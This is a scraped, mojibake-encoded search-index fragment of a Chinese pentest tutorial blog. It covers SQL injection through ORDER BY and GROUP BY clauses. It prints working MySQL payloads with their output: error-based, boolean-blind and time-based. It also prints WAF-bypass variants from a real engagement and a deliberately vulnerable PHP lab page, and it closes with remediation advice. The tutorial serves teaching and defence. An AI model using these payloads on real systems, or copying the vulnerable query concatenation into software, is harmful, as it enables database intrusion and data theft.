","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:3","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"4ã€æŠ¥é”™æ³¨å…¥ å¦‚æœåˆ—åå¯æ§ï¼Œå³ä¸º ?orderby=idçš„æƒ…å†µï¼š 1ï¼‰XPathæŠ¥é”™ mysql\u003e select * from users order by id/extractvalue(1,concat('~',(select version()))); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31' mysql\u003e select * from users order by id/updatexml(1,concat(0x7e,(select version()),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31~' 2ï¼‰GeohashæŠ¥é”™ # mysql 5.7.26 mysql\u003e select * from users order by users.id/(ST_LongFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LONGFROMGEOHASH mysql\u003e mysql\u003e select * from users order by users.id/(ST_PointFromGeoHash((select version()),1)); ERROR 1210 (HY000): Incorrect arguments to / mysql\u003e mysql\u003e select * from users order by users.id/(ST_LatFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LATFROMGEOHASH mysql\u003e # mysql 8.0.31 mysql\u003e select * from users order by id/(ST_LongFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '8.0.31' for function ST_LONGFROMGEOHASH mysql\u003e mysql\u003e select * from users order by id/(ST_PointFromGeoHash((select version()),1)); ERROR 1210 (HY000): Incorrect arguments to / mysql\u003e mysql\u003e select * from users order by id/(ST_LatFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '8.0.31' for function ST_LATFROMGEOHASH 3ï¼‰GTIDæŠ¥é”™ # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' order by users.id/(gtid_subtract(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql\u003e mysql\u003e select * from users where username like 'admin%' order by users.id/(gtid_subset(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql\u003e # mysql 8.0.31 mysql\u003e select * from users order by users.id/(gtid_subtract(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '8.0.31'. mysql\u003e mysql\u003e select * from users order by users.id/(gtid_subset(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '8.0.31'. 4ï¼‰Duplicate keyæŠ¥é”™ # mysql 5.8.26 mysql\u003e select * from users where username like 'admin%' order by (select 1 from (select count(*),concat(version(),'~',floor(rand(0)*2))x from information_schema.tables group by x)a); ERROR 1062 (23000): Duplicate entry '5.7.26~1' for key '\u003cgroup_key\u003e' mysql\u003e select * from users where username like 'admin%' order by (select count(*) from information_schema.tables group by concat((select version()),0x7e,floor(rand(0)*2))); ERROR 1062 (23000): Duplicate entry '5.7.26~1' for key '\u003cgroup_key\u003e' mysql 8.0.31ä¸é€‚ç”¨ mysql\u003e select * from users order by (select 1 from (select count(*),concat(version(),'~',floor(rand(0)*2))x from information_schema.tables group by x)a); ERROR 1242 (21000): Subquery returns more than 1 row ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:4","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"5ã€å¸ƒå°”ç›²æ³¨ 1ï¼‰IF åˆ©ç”¨ifè¯­å¥ # å‰é¢ç­‰å¼æˆç«‹åˆ™æŒ‰idåˆ—è¿›è¡Œæ’åºï¼Œä¸æˆç«‹åˆ™æŒ‰ageåˆ—è¿›è¡Œæ’åºã€‚ mysql\u003e select * from users order by if(1=0,id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 4 | aduser | 123456 | 10 | beijing | | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) mysql\u003e select * from users order by if(1=1,id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.00 sec) å¯ä»¥çœ‹åˆ°è¿™ç§æ–¹æ³•ï¼Œå¿…é¡»è¦çŸ¥é“åˆ—åï¼Œåˆ©ç”¨è¿˜æ˜¯æœ‰æ¡ä»¶çš„ã€‚ mysql\u003e select * from users order by if((substr(version(),1,1)='8'),id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) mysql\u003e select * from users order by if((substr(version(),1,1)='6'),id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 4 | aduser | 123456 | 10 | beijing | | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) ç½‘ä¸Šæœ‰äº›æ–‡ç« ç›´æ¥ç”¨æ•°å­—ä»£æ›¿åˆ—åï¼Œå¦‚if(1=1,1,4)ï¼Œä½†æ˜¯æœ¬åœ°æµ‹è¯•æ—¶ä¸¤ä¸ªç‰ˆæœ¬éƒ½æ²¡æœ‰æˆåŠŸã€‚å¦‚ä¸‹ï¼š 2ï¼‰rand åˆ©ç”¨rand() trueå’Œfalseè¿”å›é¡ºåºä¸åŒè¿›è¡Œç›²æ³¨ã€‚ order by rand(1) order by rand(0) order by rand(substr(version(),1,1)='8') 3ï¼‰ä½è¿ç®—ç¬¦ ä½è¿ç®—ç¬¦ï¼Œä¸»è¦ä½¿ç”¨^å¼‚æˆ–è¿ç®—ï¼Œå…¶ä»–ä¹Ÿå¯ order by id^0; order by id^1; select * from users order by id^(substr(version(),1,1)='8');select * from users order by id^(substr(version(),1,1)='6'); order by id^(select (select version()) regexp '^5');order by id^(select (select version()) regexp 0x5e35); # 0x5e35 \u003c-\u003e hex('^5') # æ³¨æ„ regexp åœ¨ä¸åŒç‰ˆæœ¬ä¸‹å¯¹åå…­è¿›åˆ¶åŒ¹é…ä¼šæœ‰äº›å¾®å°çš„å·®å¼‚ ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:5","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"6ã€æ—¶é—´ç›²æ³¨ order byä¼šæ ¹æ®æ•°æ®è®°å½•æ•°æŠŠå»¶æ—¶æ”¾å¤§ï¼Œæ¯”å¦‚sleep 1ç§’ï¼Œæœ‰3æ¡è®°å½•ï¼Œåˆ™æ€»å…±å»¶æ—¶ 3ç§’ã€‚ mysql\u003e select * from users order by sleep(1); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (4.02 sec) mysql\u003e select * from users order by id,if((substr(version(),1,1)=8),sleep(1),0); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (4.01 sec) ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:6","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"ä¿®å¤å»ºè®® è¦é˜²æ­¢sqlæ³¨å…¥æ”»å‡»ï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹æªæ–½ï¼š 1ã€ä½¿ç”¨å‚æ•°ç»‘å®šæˆ–é¢„ç¼–è¯‘è¯­å¥ï¼šä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘è¯­å¥ï¼Œå°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™SQLæŸ¥è¯¢ï¼Œè€Œä¸æ˜¯å°†å…¶ç›´æ¥æ‹¼æ¥åˆ°æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ¶æ„è¾“å…¥è¢«è§£é‡Šä¸ºSQLä»£ç ã€‚ 2ã€è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼šå¯¹äºåŠ¨æ€ç”Ÿæˆçš„åˆ—åæˆ–è¡¨è¾¾å¼ï¼Œç¡®ä¿å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œåªå…è®¸åˆæ³•çš„å€¼å’Œå­—ç¬¦ï¼Œé¿å…å°†æ¶æ„è¾“å…¥ä¼ é€’ç»™SQLæŸ¥è¯¢ã€‚ 3ã€æœ€å°æƒé™åŸåˆ™ï¼šåœ¨æ•°æ®åº“çš„è®¿é—®æ§åˆ¶ä¸Šï¼Œç¡®ä¿åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ•°æ®åº“è´¦æˆ·å…·æœ‰æœ€å°çš„æƒé™ï¼Œä»…é™äºæ‰§è¡Œå¿…è¦çš„æ“ä½œï¼Œä»¥å‡å°‘æ½œåœ¨çš„æ”»å‡»é¢ã€‚ å¯¹äºæ— æ³•ç›´æ¥è¿›è¡Œé¢„ç¼–è¯‘çš„å†…å®¹ï¼Œéœ€è¦åœ¨ä»£ç å±‚è¿›è¡Œè¿‡æ»¤å’Œå¤„ç†ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡æ˜ å°„çš„æ–¹å¼å°†å‰ç«¯æ¥æ”¶çš„å‚æ•°å€¼åŒ¹é…åˆ°åç«¯ç›¸åº”çš„å€¼ï¼Œå†ä¼ å…¥SQLè¿›è¡Œæ“ä½œï¼Œä»è€Œé¿å…å°†æ¶æ„è¾“å…¥ä¼ é€’ç»™SQLæŸ¥è¯¢ã€‚ ä»¥ä¸Šå°±æ˜¯æœ¬æ¬¡åˆ†äº«å…¨éƒ¨å†…å®¹ï¼Œå¦‚æœ‰çº°æ¼ï¼Œæ¬¢è¿å„ä½å¤§ä½¬äº¤æµæŒ‡æ­£ã€‚ å¾®ä¿¡æ‰«ä¸€æ‰«ï¼Œå…³æ³¨è¯¥å…¬ä¼—å· ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:3:0","tags":["SQLi"],"title":"019-SQLæ³¨å…¥ä¹‹OrderByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"æœ¬ç¯‡æ–‡ç« ä½œè€…Xavierï¼Œæœ¬æ–‡å±iæ˜¥ç§‹åŸåˆ›å¥–åŠ±è®¡åˆ’ï¼Œé¦–å‘äºiæ˜¥ç§‹è®ºå›ï¼Œæœªç»è®¸å¯ç¦æ­¢è½¬è½½ã€‚ åŸæ–‡åœ°å€ï¼šhttps://bbs.ichunqiu.com/thread-63490-1-1.html ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:0:0","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"Group by ç®€ä»‹ GROUP BY è¯­å¥å°†å…·æœ‰ç›¸åŒå€¼çš„è¡Œåˆ†ç»„ä¸ºæ±‡æ€»è¡Œï¼Œä¾‹å¦‚\"æŸ¥æ‰¾æ¯ä¸ªåœ°åŒºçš„å®¢æˆ·æ•°é‡\"ã€‚ GROUP BY è¯­å¥é€šå¸¸ä¸èšåˆå‡½æ•°ï¼ˆCOUNT()ã€MAX(), MIN(), SUM(), AVG()) æŒ‰ä¸€åˆ—æˆ–å¤šåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„ã€‚ ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:0","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"GROUP BY è¯­æ³• SELECT column_name, function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name HAVING condition ORDER BY column_name LIMIT num; åœ¨GROUP BYå­å¥ä¸­ï¼Œåˆ—å‡ºäº†è¦ç”¨äºåˆ†ç»„çš„åˆ—åã€‚æŸ¥è¯¢ç»“æœå°†æ ¹æ®è¿™äº›åˆ—çš„å€¼è¿›è¡Œåˆ†ç»„ï¼Œå…·æœ‰ç›¸åŒå€¼çš„è¡Œå°†è¢«å½’ä¸ºä¸€ç»„ã€‚ç„¶åï¼Œå¯¹äºæ¯ä¸ªç»„ï¼Œå¯ä»¥ä½¿ç”¨èšåˆå‡½æ•°æ¥è®¡ç®—æ±‡æ€»å€¼ã€‚ ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:1","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"ä½¿ç”¨åœºæ™¯ 1ï¼‰æŸ¥è¯¢æ¯ä¸ªé¡¾å®¢çš„è®¢å•æ€»é¢ ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªOrdersè¡¨åŒ…å«ä»¥ä¸‹åˆ—ï¼šOrderIDã€CustomerIDã€OrderDateå’ŒTotalAmountã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨GROUP BYè¯­å¥æŒ‰CustomerIDå¯¹è®¢å•è¿›è¡Œåˆ†ç»„ï¼Œå¹¶è®¡ç®—æ¯ä¸ªå®¢æˆ·çš„è®¢å•æ€»é‡‘é¢ï¼š SELECT CustomerID, SUM(TotalAmount) AS TotalSum FROM Orders GROUP BY CustomerID; ä»¥ä¸ŠæŸ¥è¯¢å°†è¿”å›æ¯ä¸ªå®¢æˆ·çš„CustomerIDå’Œå¯¹åº”çš„è®¢å•æ€»é‡‘é¢TotalSumã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨GROUP BYè¯­å¥æ—¶ï¼ŒSELECTå­å¥ä¸­çš„åˆ—å¿…é¡»æ˜¯åˆ†ç»„åˆ—æˆ–èšåˆå‡½æ•°çš„ç»“æœåˆ—ã€‚å¦‚æœåœ¨SELECTå­å¥ä¸­å¼•ç”¨äº†å…¶ä»–åˆ—ï¼Œåˆ™è¿™äº›åˆ—å¿…é¡»åœ¨GROUP BYå­å¥ä¸­åˆ—å‡ºã€‚ GROUP BYè¯­å¥å¯ä»¥ç”¨äºå¤šä¸ªåˆ—çš„ç»„åˆåˆ†ç»„ï¼Œä¾‹å¦‚ï¼š SELECT CustomerID, SUM(TotalAmount) AS TotalSum FROM Orders GROUP BY CustomerID; ä»¥ä¸ŠæŸ¥è¯¢å°†æŒ‰Countryå’ŒCityä¸¤åˆ—è¿›è¡Œåˆ†ç»„ï¼Œå¹¶è®¡ç®—æ¯ä¸ªç»„çš„è®°å½•æ•°ã€‚ æ€»ä¹‹ï¼ŒGROUP BYè¯­å¥åœ¨SQLä¸­ç”¨äºæŒ‰ç…§æŒ‡å®šçš„åˆ—å¯¹ç»“æœè¿›è¡Œåˆ†ç»„ï¼Œå¹¶è¿›è¡Œèšåˆè®¡ç®—ï¼Œä»¥ä¾¿æ›´å¥½åœ°ç†è§£å’Œåˆ†ææ•°æ®ã€‚ 2ï¼‰ç»Ÿè®¡å‘˜å·¥æ•°é‡æœ€å¤šçš„5ä¸ªéƒ¨é—¨ ç»Ÿè®¡æ¯ä¸ªéƒ¨é—¨çš„å‘˜å·¥æ•°é‡ï¼Œå¹¶æŒ‰ç…§å‘˜å·¥æ•°é‡é™åºæ’åºï¼Œåªè¿”å›å‰5ä¸ªéƒ¨é—¨ï¼š SELECT department, COUNT(*) as total_employees FROM employees GROUP BY department ORDER BY total_employees DESC LIMIT 5; 3ï¼‰ç»Ÿè®¡ä¸åŒéƒ¨é—¨çš„å‘˜å·¥æ€»æ•°å’Œå¹³å‡è–ªèµ„ æŸ¥è¯¢ä¸åŒéƒ¨é—¨çš„å‘˜å·¥æ€»æ•°å’Œå¹³å‡å·¥èµ„ï¼Œå¹¶å°†ç»“æœåˆå¹¶ï¼š SELECT department, COUNT(*) as total_employees, AVG(salary) as avg_salary FROM employees GROUP BY department UNION SELECT 'Overall', COUNT(*), AVG(salary) FROM employees; ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:2","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"GROUP BY æ³¨å…¥ ä¸Šé¢ç»™äº†å‡ ä¸ªgroup byçš„ä½¿ç”¨åœºæ™¯ï¼ŒGROUP BYå­å¥åé¢çš„å‚æ•°æ˜¯ç”¨äºæŒ‡å®šåˆ—åæˆ–è¡¨è¾¾å¼ï¼Œä»¥å¯¹ç»“æœè¿›è¡Œåˆ†ç»„ã€‚è¿™äº›å‚æ•°é€šå¸¸æ˜¯SQLæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ï¼Œä¸order by ä¸€æ ·ï¼Œæ— æ³•ç›´æ¥é¢„ç¼–è¯‘ï¼Œå› æ­¤ä¹Ÿå®¹æ˜“å‡ºç°SQLæ³¨å…¥ã€‚ åªä¸è¿‡ç›¸æ¯”äºorder byä½ç½®ç‚¹çš„æ³¨å…¥ï¼Œgroup byä½ç½®ç‚¹æ›´å°‘è§ä¸€äº›ã€‚ ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:0","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"æ¡ˆä¾‹ æœ€è¿‘å¸®æœ‹å‹çœ‹äº†ä¸ªæ³¨å…¥ç‚¹ï¼Œæ˜¯ä¸€ä¸ªGroupbyæ³¨å…¥ç‚¹ /api?pageSize=-1\u0026groupBy=id åœ¨groupbyå‚æ•°çš„idåŠ ä¸Šå•å¼•å·ï¼Œå¼•èµ·æŠ¥é”™ï¼Œæ³„éœ²SQLè¯­å¥ å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„group by æ˜¯å­˜åœ¨æ‹¼æ¥çš„ï¼Œè¿™ä¸ªidæ˜¯å¯æ§çš„ï¼Œå¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªæ³¨å…¥ç‚¹ã€‚ æŠŠSQLè¯­å¥ç®€åŒ–ä»¥ä¸‹å°±æ˜¯ï¼š select 1,2,3...,17 from table were table.a is null group by table.id è¿™å…¶ä¸­çš„idæ˜¯å¯æ§çš„ï¼Œä¼ è¿›å»å°±ä¼šä¸table.è¿›è¡Œæ‹¼æ¥ï¼Œåƒè¿™ä¸ªgroup byä½ç½®çš„æ³¨å…¥ç‚¹ï¼Œæˆ‘å¾ˆå°‘æœ‰è§åˆ°ã€‚ å…ˆè¯´ç»“æœï¼Œæ³¨å‡ºæ¥äº†ï¼Œæœ‰wafï¼Œæœ€åçš„å‡ ç§payload: # è½¬æ¢æˆorder byï¼Œåˆ©ç”¨rand()è¿›è¡Œæ¡ä»¶å¸ƒå°”æ³¨å…¥ï¼šid order by rand(substr(version(),1,1)='8')ï¼Œurlç¼–ç ç»•è¿‡waf id+order+by+rand(%73%75%62%73%74%72%28%76%65%72%73%69%6f%6e%28%29,1,1)='8') # æŠ¥é”™æ³¨å…¥ï¼Œid and extractvalue(0x5c,concat(1,(select version()))) id/**/and/**/extractvalue(0x5c,concat('~',/*!60000select*//**/version())) # æŠ¥é”™æ³¨å…¥ï¼Œ id/**/and/**/updatexml(1,concat(0x7e,(/*!12345select*//**/version()),0x7e),1) å¸ƒå°”æ³¨å…¥çš„é¡ºåºä¼šä¸åŒï¼Œå¾—å‡ºç‰ˆæœ¬ï¼š è¿™é‡Œæˆ‘å­—ç¬¦åŠ å°‘äº†ï¼ŒåªåŠ äº†æ•°å­—0-9ï¼Œå­—æ¯a-fï¼Œå’Œç¬¦å·.å·ï¼Œä½†ç‰ˆæœ¬çš„è¯å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ•°å­—0-9ï¼ŒåŠ ä¸Šç¬¦å·ç‚¹å·.ï¼Œå¤Ÿç”¨äº†ã€‚å¦‚æœæ˜¯æ•°æ®åº“åçš„è¯ï¼Œæƒ³è¦å…¨ä¸€ç‚¹å°±æ˜¯å¤§å°å†™å­—æ¯+æ•°å­—+çŸ­æ å’Œä¸‹åˆ’çº¿ã€‚ æŠ¥é”™æ³¨å…¥æˆªå›¾ï¼š extractvalueè¯­å¥ï¼š updatexmlè¯­å¥ï¼š ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:1","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"æœ¬åœ°ç¯å¢ƒ å› ä¸ºgroup byåé¢çš„æ³¨å…¥ç‚¹ä¹‹å‰æ²¡æ€ä¹ˆé‡åˆ°è¿‡ï¼Œè¿™æ¬¡å°±é¡ºä¾¿ç ”ç©¶ä¸‹ï¼Œåœ¨æœ¬åœ°æ•°æ®åº“mysqlä¸‹è¿›è¡Œæµ‹è¯•ã€‚ æ”¹äº†ä¸‹sqli-labsåšæ¡ˆä¾‹ï¼Œæ–°å»ºäº†ä¸€ä¸ªlessï¼Œä»£ç å¦‚ä¸‹ï¼š \u003c?php include(\"../sql-connections/sql-connect.php\"); error_reporting(0); if(isset($_GET['groupby'])) { $groupby=$_GET['groupby']; $sql=\"select * from users where username like 'admin%' group by $groupby \"; #$sql=\"select * from users where username like 'admin%' group by user.$groupby \"; $result=mysql_query($sql); echo $sql.'\u003cbr\u003e'; if($result){ $rows = mysql_num_rows($result); echo 'æŸ¥è¯¢ç»“æœå…±æœ‰'.$rows.'æ¡è®°å½•\u003cbr\u003e'; echo \"\u003ctable\u003e \u003ctr\u003e \u003cth\u003eåºå·\u003c/th\u003e \u003cth\u003eå§“å\u003c/th\u003e \u003cth\u003eå¯†ç \u003c/th\u003e \u003ctr\u003e\"; if($rows\u003e0){ $count = 1; while($row = mysql_fetch_assoc($result)){ echo \"\u003ctr\u003e \u003ctd\u003e\".$row['id'].\"\u003c/td\u003e \u003ctd\u003e\".$row['username'].\"\u003c/td\u003e \u003ctd\u003e\".$row['password'].\"\u003c/td\u003e \u003c/tr\u003e\"; } $count++; } echo \"\u003c/table\u003e\"; }else { echo '\u003cfont color= \"#FFFF00\"\u003e'; print_r(mysql_error()); echo \"\u003c/font\u003e\"; } } else { echo \"Please input the ID as parameter with numeric value\";} ?\u003e ä¸‹é¢æ¼”ç¤ºç”¨åˆ°äº†ä¸¤ä¸ªæ•°æ®è¡¨ã€‚ # sqli-labs æ•°æ®åº“ï¼Œç‰ˆæœ¬5.7.26 mysql\u003e select * from users; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ 13 rows in set (0.02 sec) # è‡ªå»ºæ•°æ®åº“ï¼Œç‰ˆæœ¬8.0.31 mysql\u003e select * from users; +----+-------+----------+------+-----------+ | id | name | pass | age | area | +----+-------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+-------+----------+------+-----------+ 3 rows in set (0.01 sec) ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:2","tags":["SQLi"],"title":"018-SQLæ³¨å…¥ä¹‹GroupByä½ç½®ç‚¹æ³¨å…¥","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"è·å–å­—æ®µæ•° group by åé¢åŠ æ•°å­—å°±èƒ½è¿›è¡Œå­—æ®µæ•°çš„æšä¸¾ï¼Œå½“æ•°å­—å¤§äºå­—æ®µæ•°æ—¶ï¼Œå°±ä¼šäº§ç”Ÿå¦‚ä¸‹æŠ¥é”™ï¼š # mysql 8.0.31 mysql\u003e select * from users where id=2 group by 5; +----+-------+--------+------+----------+ | id | name | pass | age | area | +----+-------+--------+------+----------+ | 2 | test2 | 543210 | 20 | shanghai | +----+-------+--------+------+----------+ 1 row in set (0.02 sec) mysql\u003e select * from users where id=2 group by 6; ERROR 1054 (42S22): Unknown column '6' in 'group statement' è¿˜æœ‰ä¸€ç§æŠ¥é”™æƒ…å†µï¼Œå¦‚ä¸‹ï¼š # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' group by 1; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | +----+----------+----------+ 5 rows in set (0.00 sec) mysql\u003e select * from users where username like 'admin%' group by 2; ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'security.users.id' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by mysql\u003e select * from users where username like 'admin%' group by 3; ERROR 1055 (42000): Expression #1 